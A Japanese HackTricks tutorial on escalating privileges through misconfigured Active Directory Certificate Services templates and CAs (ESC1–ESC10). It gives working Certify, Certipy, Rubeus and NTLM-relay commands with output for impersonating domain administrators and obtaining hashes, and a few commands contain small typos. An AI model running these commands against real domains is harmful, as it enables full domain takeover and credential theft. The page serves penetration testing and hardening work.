# AD CS ドメインエスカレーション

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**@carlospolopm**をフォローする🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**これは、投稿のエスカレーション技術セクションの要約です:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 設定ミスのある証明書テンプレート - ESC1

### 説明

### 設定ミスのある証明書テンプレート - ESC1 の説明

* **エンタープライズCAによって低特権ユーザーに登録権限が付与されています。**
* **マネージャーの承認は必要ありません。**
* **権限のある人物からの署名は必要ありません。**
* **証明書テンプレートのセキュリティ記述子が過度に許可されており、低特権ユーザーが登録権限を取得できます。**
* **証明書テンプレートは、認証を容易にするEKUを定義するように構成されています:**
* クライアント認証（OID 1.3.6.1.5.5.7.3.2）、PKINITクライアント認証（1.3.6.1.5.2.3.4）、スマートカードログオン（OID 1.3.6.1.4.1.311.20.2.2）、任意の目的（OID 2.5.29.37.0）、またはEKUなし（SubCA）などの拡張キー使用（EKU）識別子が含まれています。
* **リクエスターが証明書署名リクエスト（CSR）にsubjectAltNameを含めることができる機能がテンプレートで許可されています:**
* Active Directory（AD）は、証明書内のsubjectAltName（SAN）を優先して識別検証に使用します。これは、CSRでSANを指定することで、証明書をリクエストして任意のユーザー（例：ドメイン管理者）を偽装することができることを意味します。リクエスターがSANを指定できるかどうかは、証明書テンプレートのADオブジェクトで`mspki-certificate-name-flag`プロパティを介して示されます。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグの存在により、リクエスターがSANを指定できるようになります。

{% hint style="danger" %}
述べられた構成により、低特権ユーザーが選択した任意のSANを持つ証明書をリクエストし、KerberosまたはSChannelを介して任意のドメインプリンシパルとして認証できます。
{% endhint %}

この機能は、製品や展開サービスによるHTTPSまたはホスト証明書の即座の生成をサポートするために有効にされることがあります。または、理解不足によるものです。

このオプションを使用して証明書を作成すると、既存の証明書テンプレート（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`が有効になっている`WebServer`テンプレートなど）を複製して変更して認証OIDを含める場合、警告がトリガーされることに注意してください。

### 悪用

**脆弱な証明書テンプレートを見つける**には、次のコマンドを実行できます:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすます**には、次のコマンドを実行できます：
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
次に、生成された**証明書を`.pfx`形式に変換**し、再度**Rubeusやcertipyを使用して認証**することができます。
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windowsのバイナリ「Certreq.exe」と「Certutil.exe」を使用して、PFXを生成することができます：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forestの構成スキーマ内の証明書テンプレートの列挙、特に承認や署名が必要ないもの、クライアント認証またはスマートカードログオンEKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効になっているものは、次のLDAPクエリを実行することで実行できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 設定ミスのある証明書テンプレート - ESC2

### 説明

2番目の悪用シナリオは最初のもののバリエーションです：

1. 低特権ユーザーに対してエンタープライズCAによって登録権限が付与されています。
2. マネージャーの承認要件が無効になっています。
3. 承認された署名の必要性が省略されています。
4. 証明書テンプレートのセキュリティ記述子が過度に許可されており、低特権ユーザーに証明書の登録権限が付与されています。
5. **証明書テンプレートには、Any Purpose EKUまたはEKUが含まれていません。**

**Any Purpose EKU**は、クライアント認証、サーバー認証、コード署名など、**任意の目的**で証明書を取得できるようにします。このシナリオを悪用するためには、**ESC3で使用される技術**と同じ手法を使用できます。

**EKUがない**証明書は、下位CA証明書として機能し、**任意の目的**で悪用され、**新しい証明書に署名するためにも使用できます**。したがって、攻撃者は下位CA証明書を利用して、新しい証明書に任意のEKUやフィールドを指定できます。

ただし、**ドメイン認証**用に作成された新しい証明書は、**`NTAuthCertificates`**オブジェクトによって信頼されていない場合、機能しません。これはデフォルトの設定です。それでも、攻撃者は任意のEKUと任意の証明書値で**新しい証明書を作成**することができます。これらは、広範囲の目的（コード署名、サーバー認証など）に**悪用**され、SAML、AD FS、IPSecなどのネットワーク内の他のアプリケーションに重大な影韸を与える可能性があります。

このシナリオに一致するテンプレートをAD Forestの構成スキーマ内で列挙するには、次のLDAPクエリを実行できます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 設定ミスの登録エージェントテンプレート - ESC3

### 説明

このシナリオは、**異なるEKU**（証明書リクエストエージェント）を**悪用**し、**2つの異なるテンプレート**を使用する点で最初と2番目と同様です。

**証明書リクエストエージェントEKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoftのドキュメントでは**登録エージェント**として知られており、主体が**他のユーザーの代わりに証明書を登録**することを可能にします。

**「登録エージェント」**はそのような**テンプレート**に登録し、結果として得られた**証明書を他のユーザーの代わりにCSRに共同署名**します。その後、**共同署名されたCSR**をCAに送信し、**「代理で登録」を許可するテンプレート**に登録し、CAは**「他の」ユーザーに属する証明書**で応答します。

**要件1:**

* 企業CAによって低特権ユーザーに登録権限が付与されています。
* マネージャーの承認が省略されています。
* 承認された署名の要件はありません。
* 証明書テンプレートのセキュリティ記述子が過剰に許可されており、低特権ユーザーに登録権限が付与されています。
* 証明書テンプレートにはCertificate Request Agent EKUが含まれており、他の主体の代わりに他の証明書テンプレートのリクエストを可能にしています。

**要件2:**

* 企業CAは低特権ユーザーに登録権限を付与します。
* マネージャーの承認がバイパスされます。
* テンプレートのスキーマバージョンは1または2を超えており、Certificate Request Agent EKUを必要とするApplication Policy Issuance Requirementが指定されています。
* 証明書テンプレートで定義されたEKUはドメイン認証を許可します。
* CAに登録エージェントの制限が適用されていません。

### 悪用

[**Certify**](https://github.com/GhostPack/Certify)または[**Certipy**](https://github.com/ly4k/Certipy)を使用して、このシナリオを悪用できます。
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**ユーザー**が**登録エージェント証明書**を取得できるように許可されている**ユーザー**、登録エージェントが登録を許可されている**テンプレート**、および登録エージェントがアクションを起こす**アカウント**は、エンタープライズCAによって制限できます。これは、`certsrc.msc` **スナップイン**を開き、**CAを右クリック**して**プロパティをクリック**し、次に「登録エージェント」タブに**移動**することで達成されます。

ただし、CAの**デフォルト**設定は「**登録エージェントを制限しない**」ことが指摘されています。管理者によって登録エージェントへの制限が有効になると、「登録エージェントを制限する」に設定すると、デフォルトの構成は非常に許可的なままです。これにより、**Everyone**が誰でもすべてのテンプレートに登録できるようになります。

## 脆弱な証明書テンプレートアクセス制御 - ESC4

### **説明**

**証明書テンプレート**の**セキュリティ記述子**は、テンプレートに関する特定の**ADプリンシパル**が持つ**権限**を定義します。

**攻撃者**が**テンプレート**を**変更**し、**前のセクション**で説明されている**悪用可能なミス構成**を**導入**するために必要な**権限**を持っている場合、特権昇格が容易になります。

証明書テンプレートに適用される注目すべき権限には次のものがあります：

* **Owner:** オブジェクトに対する暗黙の制御を付与し、任意の属性を変更できる。
* **FullControl:** オブジェクトに対する完全な権限を付与し、任意の属性を変更できる。
* **WriteOwner:** オブジェクトの所有者を攻撃者の制御下のプリンシパルに変更できる。
* **WriteDacl:** アクセス制御を調整し、攻撃者にFullControlを付与する可能性がある。
* **WriteProperty:** 任意のオブジェクトプロパティを編集する権限を承認する。

### 悪用

前述のような特権昇格の例：

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対する書き込み権限を持っている場合です。これは、たとえば証明書テンプレートの構成を上書きしてテンプレートをESC1に脆弱にするために悪用される可能性があります。

上記のパスで見られるように、これらの権限を持っているのは`JOHNPC`だけですが、私たちのユーザー`JOHN`は`JOHNPC`に新しい`AddKeyCredentialLink`エッジを持っています。このテクニックは証明書に関連しているため、[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られるこの攻撃も実装しています。ここでは、Certipyの`shadow auto`コマンドを使用して被害者のNTハッシュを取得する方法を少し紹介します。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**は、1つのコマンドで証明書テンプレートの構成を上書きできます。**デフォルト**では、Certipyは構成を**ESC1に脆弱**にするように上書きします。攻撃後に構成を**復元**するために、**`-save-old`パラメータを指定**することもできます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱なPKIオブジェクトアクセス制御 - ESC5

### 説明

証明書テンプレートや認証局を超えた複数のオブジェクトを含むACLベースの相互関係の広範なウェブは、AD CSシステム全体のセキュリティに影響を与える可能性があります。セキュリティに大きな影響を与えるこれらのオブジェクトには、次のものが含まれます：

- CAサーバーのADコンピュータオブジェクトは、S4U2SelfやS4U2Proxyなどのメカニズムを介して侵害される可能性があります。
- CAサーバーのRPC/DCOMサーバー。
- 特定のコンテナパス`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`内の任意の子孫ADオブジェクトまたはコンテナ。このパスには、証明書テンプレートコンテナ、認証局コンテナ、NTAuthCertificatesオブジェクト、およびEnrollment Servicesコンテナなどが含まれます。

PKIシステムのセキュリティは、低特権の攻撃者がこれらの重要なコンポーネントのいずれかを制御できる場合に危険にさらされる可能性があります。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[CQure Academyの投稿](https://cqureacademy.com/blog/enhanced-key-usage)で議論されている主題は、Microsoftによって概説された**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグの影響にも触れています。この構成は、認証局（CA）で有効になっている場合、**ユーザー定義の値**を**サブジェクト代替名**に含めることを許可します。これには、Active Directory®から構築されたリクエストを含む**任意のリクエスト**が含まれます。したがって、この構成により、**侵入者**がドメイン**認証**向けに設定された**任意のテンプレート**（特に権限のないユーザーが利用できるもの）を介して登録できるようになります。その結果、侵入者はドメイン管理者やドメイン内の**他のアクティブなエンティティ**として認証できる証明書を取得できます。

**注意**: `certreq.exe`の`-attrib "SAN:"`引数を介して証明書署名リクエスト（CSR）に**代替名**を追加するアプローチ（「名前値ペア」と呼ばれる）は、ESC1でのSANの悪用戦略とは**異なり**ます。ここでは、アカウント情報が拡張子ではなく証明書属性内に**カプセル化される方法**に違いがあります。

### 悪用

設定が有効になっているかどうかを確認するために、組織は`certutil.exe`を使用して次のコマンドを利用できます：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は基本的に**リモートレジストリアクセス**を使用しているため、代替手段として次の方法が考えられます:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
ツール[**Certify**](https://github.com/GhostPack/Certify)や[**Certipy**](https://github.com/ly4k/Certipy)などは、このミス構成を検出し、それを悪用することができます:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていると仮定して、次のコマンドを任意のワークステーションから実行できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
この構成を無効にするには、次のようにフラグを削除できます：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
2022年5月のセキュリティ更新プログラムの後、新しく発行される**証明書**には、**セキュリティ拡張機能**が含まれ、**要求者の`objectSid`プロパティ**が組み込まれます。ESC1の場合、このSIDは指定されたSANから派生します。しかし、**ESC6**の場合、SIDはSANではなく、**要求者の`objectSid`**を反映します。\
ESC6を悪用するには、システムが**ESC10（弱い証明書マッピング）**に対して脆弱であることが不可欠であり、これは**SANを新しいセキュリティ拡張機能よりも優先する**ものです。
{% endhint %}

## 脆弱な証明書機関アクセス制御 - ESC7

### 攻撃1

#### 説明

証明書機関のアクセス制御は、CAのアクションを規定する一連の権限を介して維持されます。これらの権限は、`certsrv.msc`にアクセスしてCAを右クリックし、プロパティを選択し、その後セキュリティタブに移動することで表示できます。さらに、PSPKIモジュールを使用して、次のようなコマンドで権限を列挙することもできます：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これにより、主要な権限である**`ManageCA`**と**`ManageCertificates`**に関連付けられる「CA管理者」と「証明書マネージャー」の役割が明らかになります。

#### 濫用

証明機関で**`ManageCA`**権限を持つことにより、PSPKIを使用してリモートで設定を操作することが可能になります。これには、任意のテンプレートでSAN指定を許可する**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグを切り替えることが含まれ、これはドメインエスカレーションの重要な側面です。

このプロセスを簡素化することは、PSPKIの**Enable-PolicyModuleFlag**コマンドレットを使用して、直接のGUI操作なしに変更を行うことが可能です。

**`ManageCertificates`**権限を持つことで、保留中のリクエストを承認することが容易になり、「CA証明書マネージャーの承認」保護を迂回することができます。

**Certify**と**PSPKI**モジュールの組み合わせを使用して、証明書のリクエスト、承認、ダウンロードを行うことができます：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻撃2

#### 説明

{% hint style="warning" %}
**前回の攻撃**では、**`Manage CA`** 権限を使用して **EDITF\_ATTRIBUTESUBJECTALTNAME2** フラグを有効にして **ESC6攻撃** を実行しましたが、これはCAサービス（`CertSvc`）が再起動されるまで効果がありません。ユーザーが `Manage CA` アクセス権を持っていると、ユーザーはサービスを再起動することも許可されます。ただし、ユーザーがリモートでサービスを再起動できるわけではありません。さらに、**ESC6** は、2022年5月のセキュリティ更新プログラムにより、ほとんどのパッチ済み環境でデフォルトで機能しない可能性があります。
{% endhint %}

したがって、ここでは別の攻撃が提示されています。

前提条件：

- **`ManageCA` 権限のみ**
- **`Manage Certificates`** 権限（**`ManageCA`** から付与される可能性があります）
- 証明書テンプレート **`SubCA`** が **有効**である必要があります（**`ManageCA`** から有効にできます）

このテクニックは、`Manage CA` および `Manage Certificates` アクセス権を持つユーザーが **失敗した証明書リクエストを発行** できるという事実に依存しています。 **`SubCA`** 証明書テンプレートは **ESC1に脆弱** ですが、**管理者のみ** がテンプレートに登録できます。したがって、**ユーザー** は **`SubCA`** に登録をリクエストすることができますが（**拒否される**）、その後で **マネージャーによって発行されます**。

#### 悪用

新しいオフィサーとしてユーザーを追加することで、**`Manage Certificates`** アクセス権を **自分に付与** することができます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`**テンプレートは、`-enable-template`パラメータを使用してCAで有効にできます。デフォルトでは、`SubCA`テンプレートは有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
もし、この攻撃の前提条件を満たしている場合、**`SubCA`テンプレートに基づいて証明書をリクエスト**することから始めることができます。

**このリクエストは拒否**されますが、プライベートキーを保存し、リクエストIDをメモしておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA`および`Manage Certificates`**を使用して、`ca`コマンドと`-issue-request <request ID>`パラメーターを使用して、**失敗した証明書のリクエストを発行**できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
そして、`req`コマンドと`-retrieve <request ID>`パラメータを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## AD CS HTTPエンドポイントへのNTLMリレー - ESC8

### 説明

{% hint style="info" %}
**AD CSがインストールされている環境**では、**脆弱なWebエンロールメントエンドポイント**が存在し、**少なくとも1つの証明書テンプレートが公開されている**場合（デフォルトの**`Machine`**テンプレートなど）、**スプーラーサービスがアクティブなコンピューターは攻撃者によって侵害される可能性があります**！
{% endhint %}

AD CSでは、**複数のHTTPベースのエンロールメントメソッド**がサポートされており、管理者がインストールできる追加のサーバーロールを介して利用できます。これらのHTTPベースの証明書エンロールメント用インターフェースは、**NTLMリレーアタック**の影響を受けます。**侵害されたマシンから、攻撃者は着信NTLM経由で認証される任意のADアカウントをなりすます**ことができます。被害者アカウントをなりすましている間、攻撃者はこれらのWebインターフェースにアクセスして、`User`または`Machine`証明書テンプレートを使用してクライアント認証証明書を要求できます。

- **Webエンロールメントインターフェース**（`http://<caserver>/certsrv/`で利用可能な古いASPアプリケーション）は、デフォルトでHTTPのみであり、NTLMリレーアタックに対する保護を提供しません。さらに、その認証HTTPヘッダーを介して明示的にNTLM認証のみを許可しており、Kerberosなどのより安全な認証方法を適用できなくしています。
- **証明書エンロールメントサービス**（CES）、**証明書エンロールメントポリシー**（CEP）Webサービス、および**ネットワークデバイスエンロールメントサービス**（NDES）は、デフォルトで認証HTTPヘッダーを介してネゴシエート認証をサポートしています。ネゴシエート認証はKerberosと**NTLMの両方をサポート**し、リレーアタック中に**NTLMにダウングレード**することが可能です。これらのWebサービスはデフォルトでHTTPSをサポートしていますが、HTTPS単体では**NTLMリレーアタックから保護されません**。HTTPSサービスのNTLMリレーアタックからの保護は、HTTPSがチャネルバインディングと組み合わされた場合のみ可能です。残念ながら、AD CSはIISで拡張保護を有効にしないため、チャネルバインディングにはIISで拡張保護が必要です。

NTLMリレーアタックの**一般的な問題**は、**NTLMセッションの短い期間**と、**NTLM署名が必要なサービスとのやり取りができない**ことです。

ただし、この制限は、NTLMリレーアタックを利用してユーザーの証明書を取得することで克服されます。証明書の有効期間がセッションの期間を規定し、証明書を**NTLM署名が必要なサービスで使用**できるためです。盗まれた証明書の使用方法については、次を参照してください：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLMリレーアタックのもう1つの制限は、**攻撃者が制御するマシンが被害者アカウントによって認証される必要がある**ということです。攻撃者は、この認証を待つか、または**強制的に**試みることができます：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify)の`cas`は、**有効なHTTP AD CSエンドポイントを列挙**します：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ証明書機関（CAs）が証明書登録サービス（CES）エンドポイントを保存するために使用されます。これらのエンドポイントは、ツール **Certutil.exe** を利用して解析およびリスト化することができます。
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### 証明書の悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)を悪用

証明書のリクエストは、アカウント名が`$`で終わるかどうかによって、Certipyによってデフォルトで`Machine`または`User`のテンプレートに基づいて行われます。別のテンプレートを指定するには、`-template`パラメータを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のようなテクニックを使用して認証を強制することができます。ドメインコントローラを扱う場合、`-template DomainController`の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張機能なし - ESC9 <a href="#id-5485" id="id-5485"></a>

### 説明

新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は **`msPKI-Enrollment-Flag`** に対する ESC9 として参照され、証明書に **新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張機能** を埋め込むことを防止します。このフラグは、`StrongCertificateBindingEnforcement` が `1` に設定されている場合（デフォルト設定）、`2` とは対照的です。ESC9 の欠如は要件を変更しないため、Kerberos や Schannel のためのより弱い証明書マッピングが悪用される可能性がある（ESC10 のような場合）場合に、このフラグが重要となります。

このフラグの設定が重要となる条件には以下が含まれます:

* `StrongCertificateBindingEnforcement` が `2` に調整されていない場合（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている場合。
* 証明書が `msPKI-Enrollment-Flag` 設定内で `CT_FLAG_NO_SECURITY_EXTENSION` フラグでマークされている場合。
* 証明書で任意のクライアント認証 EKU が指定されている場合。
* 他のアカウントを妥協させるために `GenericWrite` 権限が利用可能である場合。

### 悪用シナリオ

`John@corp.local` が `Jane@corp.local` 上の `GenericWrite` 権限を持ち、`Administrator@corp.local` を妥協することを目指すとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートは、その `msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。

最初に、`John` の `GenericWrite` により、`Jane` のハッシュが Shadow Credentials を使用して取得されます:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、意図的に`@corp.local`ドメイン部分が省略されました:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は制約を犯さず、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として区別されたままであることが確認されます。

この後、脆弱性があるとマークされた `ESC9` 証明書テンプレートが `Jane` としてリクエストされます：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
以下は、証明書の `userPrincipalName` が「Administrator」を反映しており、「object SID」が存在しないことが記載されています。

その後、`Jane` の `userPrincipalName` は元に戻され、`Jane@corp.local` に戻ります。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
認証を発行された証明書で試みると、`Administrator@corp.local` の NT ハッシュが得られます。証明書にドメインの指定がないため、コマンドには `-domain <domain>` を含める必要があります。
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱い証明書マッピング - ESC10

### 説明

ESC10で言及されるドメインコントローラー上の2つのレジストリキー値：

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`の`CertificateMappingMethods`のデフォルト値は`0x18` (`0x8 | 0x10`) で、以前は`0x1F`に設定されていました。
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`の`StrongCertificateBindingEnforcement`のデフォルト設定は`1`で、以前は`0`でした。

**ケース1**

`StrongCertificateBindingEnforcement`が`0`として構成されている場合。

**ケース2**

`CertificateMappingMethods`に`UPN`ビット (`0x4`) が含まれている場合。

### 悪用ケース1

`StrongCertificateBindingEnforcement`が`0`として構成されている場合、`GenericWrite`権限を持つアカウントAを悪用して、任意のアカウントBを危険にさらすことができます。

例えば、`Jane@corp.local`に対する`GenericWrite`権限を持っている場合、攻撃者は`Administrator@corp.local`を危険にさらすことを目指します。手順はESC9を模倣し、任意の証明書テンプレートを利用できるようにします。

最初に、`Jane`のハッシュを取得し、Shadow Credentialsを悪用します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、意図的に`@corp.local`部分が省略され、制約違反を回避しています。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
以下では、デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証を可能にする証明書がリクエストされます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`の`userPrincipalName`はその後元に戻され、`Jane@corp.local`になります。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
